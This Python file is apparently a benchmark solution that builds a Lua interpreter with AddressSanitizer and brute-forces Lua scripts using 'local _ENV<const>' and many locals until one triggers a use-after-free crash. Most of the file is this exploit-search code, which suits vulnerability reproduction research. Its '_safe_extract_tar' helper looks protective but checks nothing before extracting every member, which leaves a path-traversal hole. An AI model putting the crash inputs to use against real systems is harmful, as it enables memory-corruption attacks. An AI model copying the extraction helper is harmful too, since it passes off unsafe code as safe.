import os
import re
import tarfile
import tempfile
import subprocess
import shutil
from typing import List, Optional, Tuple


LUA_KEYWORDS = {
    "and", "break", "do", "else", "elseif", "end", "false", "for", "function",
    "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return",
    "then", "true", "until", "while",
}


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        base = os.path.realpath(dst_dir)
        for m in tf.getmembers():
            name = m.name
            if not name or name == ".":
                continue
            out_path = os.path.realpath(os.path.join(dst_dir, name))
            if not (out_path == base or out_path.startswith(base + os.sep)):
                continue
        tf.extractall(dst_dir)


def _find_project_root(extract_dir: str) -> str:
    entries = [e for e in os.listdir(extract_dir) if e not in (".", "..", "__MACOSX")]
    if len(entries) == 1:
        p = os.path.join(extract_dir, entries[0])
        if os.path.isdir(p):
            return p
    return extract_dir


def _which(cmd: str) -> Optional[str]:
    return shutil.which(cmd)


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=timeout,
        check=False,
    )


def _find_executable_named(root: str, names: Tuple[str, ...]) -> Optional[str]:
    candidates = []
    for dirpath, dirnames, filenames in os.walk(root):
        for fn in filenames:
            if fn in names:
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not (st.st_mode & 0o111):
                    continue
                candidates.append(p)
    if not candidates:
        return None
    candidates.sort(key=lambda x: (len(x), x))
    return candidates[0]


def _has_lua_sources(root: str) -> bool:
    likely = [
        os.path.join(root, "src", "lua.c"),
        os.path.join(root, "src", "lparser.c"),
        os.path.join(root, "src", "lcode.c"),
        os.path.join(root, "Makefile"),
    ]
    return any(os.path.exists(p) for p in likely)


def _build_lua_asan(root: str) -> Optional[str]:
    if not os.path.exists(os.path.join(root, "Makefile")):
        return None

    cc = _which("clang") or _which("gcc")
    if not cc:
        return None
    cc_name = os.path.basename(cc)

    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
    if env["ASAN_OPTIONS"]:
        env["ASAN_OPTIONS"] += ":"
    env["ASAN_OPTIONS"] += "detect_leaks=0:abort_on_error=1"

    mycflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
    myldflags = "-fsanitize=address"

    make_cmds = [
        ["make", "-j8", "guess", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
        ["make", "-j8", "linux", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
        ["make", "-j8", "posix", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
        ["make", "-j8", "generic", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
        ["make", "-j8", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
    ]

    for cmd in make_cmds:
        try:
            r = _run(cmd, cwd=root, env=env, timeout=180)
        except Exception:
            continue
        if r.returncode == 0:
            lua_bin = _find_executable_named(root, ("lua",))
            if lua_bin:
                return lua_bin

    lua_bin = _find_executable_named(root, ("lua",))
    return lua_bin


def _lua_ident_gen(n: int, reserved: set) -> List[str]:
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    names = []
    i = 0
    while len(names) < n:
        x = i
        s = ""
        base = len(alphabet)
        while True:
            s = alphabet[x % base] + s
            x //= base
            if x == 0:
                break
        i += 1
        if s in LUA_KEYWORDS or s in reserved or s.startswith("_"):
            continue
        names.append(s)
    return names


def _gen_pat0(n_dummy: int) -> bytes:
    # Minimal: declare _ENV<const>, lots of dummy locals, then access globals.
    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s"}
    vars_ = _lua_ident_gen(n_dummy, reserved)
    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
    code = "local _ENV<const>=_ENV;" + dummy + "local t=tostring;t(0);"
    return code.encode("utf-8")


def _gen_pat1(n_dummy: int) -> bytes:
    # Nested closure capturing _ENV and other upvalues; execute.
    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s"}
    vars_ = _lua_ident_gen(n_dummy, reserved)
    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
    code = (
        "local _ENV<const>=_ENV;"
        + dummy +
        "local function o()local x=0;return function()return tostring(x)..tostring(print)end end;"
        "o()();"
    )
    return code.encode("utf-8")


def _gen_pat2(n_dummy: int) -> bytes:
    # Add global set/get under const _ENV; execute.
    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s", "X"}
    vars_ = _lua_ident_gen(n_dummy, reserved)
    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
    code = (
        "local _ENV<const>=_ENV;"
        + dummy +
        "X=0;"
        "local function o()local x=1;return function()X=X+1;return tostring(x)..tostring(X)..tostring(print)end end;"
        "o()();"
    )
    return code.encode("utf-8")


def _gen_pat_load(n_dummy: int) -> bytes:
    # Compile a nested chunk that declares _ENV<const>; run it a few times with GC.
    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s", "L"}
    vars_ = _lua_ident_gen(n_dummy, reserved)
    dummy = ("local " + ",".join(vars_)) if vars_ else ""
    inner = "local _ENV<const>=_ENV;" + (dummy + ";") + "local t=tostring;t(0);"
    inner = inner.replace("]", "\\]")
    code = (
        "local L=[[" + inner + "]];"
        "for i=1,5 do local f=assert(load(L));f();collectgarbage() end;"
    )
    return code.encode("utf-8")


def _run_lua_and_check_crash(lua_bin: str, script: bytes, work_dir: str) -> bool:
    p = os.path.join(work_dir, "poc.lua")
    with open(p, "wb") as f:
        f.write(script)
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
    if env["ASAN_OPTIONS"]:
        env["ASAN_OPTIONS"] += ":"
    env["ASAN_OPTIONS"] += "detect_leaks=0:abort_on_error=1"
    try:
        r = subprocess.run(
            [lua_bin, p],
            cwd=work_dir,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3,
            check=False,
        )
    except Exception:
        return False
    if r.returncode == 0:
        return False
    err = r.stderr or b""
    if b"AddressSanitizer" in err or b"heap-use-after-free" in err or b"use-after-free" in err:
        return True
    return False


def _find_min_n_for_pattern(lua_bin: str, gen_func, work_dir: str, max_n: int) -> Optional[Tuple[int, bytes]]:
    checkpoints = [0, 1, 2, 4, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 188, max_n]
    checkpoints = sorted(set([c for c in checkpoints if 0 <= c <= max_n]))
    prev = 0
    for c in checkpoints:
        script = gen_func(c)
        if _run_lua_and_check_crash(lua_bin, script, work_dir):
            for n in range(prev, c + 1):
                script2 = gen_func(n)
                if _run_lua_and_check_crash(lua_bin, script2, work_dir):
                    return n, script2
            return c, script
        prev = c + 1
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = _gen_pat_load(160)

        with tempfile.TemporaryDirectory() as td:
            try:
                _safe_extract_tar(src_path, td)
            except Exception:
                return fallback

            root = _find_project_root(td)
            if not _has_lua_sources(root):
                return fallback

            lua_bin = _build_lua_asan(root)
            if not lua_bin:
                return fallback

            with tempfile.TemporaryDirectory() as wd:
                patterns = [
                    _gen_pat1,
                    _gen_pat2,
                    _gen_pat0,
                    _gen_pat_load,
                ]
                max_n = 190
                for gen in patterns:
                    res = _find_min_n_for_pattern(lua_bin, gen, wd, max_n)
                    if res is not None:
                        return res[1]

        return fallback